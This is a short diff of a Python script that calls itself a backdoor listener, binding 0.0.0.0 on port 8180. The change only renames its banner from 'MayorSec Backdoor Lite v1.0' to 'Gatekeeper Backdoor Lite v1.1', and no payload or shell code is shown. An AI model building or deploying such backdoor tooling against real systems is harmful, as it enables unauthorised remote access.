@@ -14,9 +14,9 @@ hostIP = '0.0.0.0'
 hostPort = 8180
 banner = (b"""
 ================================================
-               MayorSec Backdoor
+              Gatekeeper Backdoor
                      Lite               
-                     v1.0               
+                     v1.1              
 ================================================
 """)
 time.sleep(1)
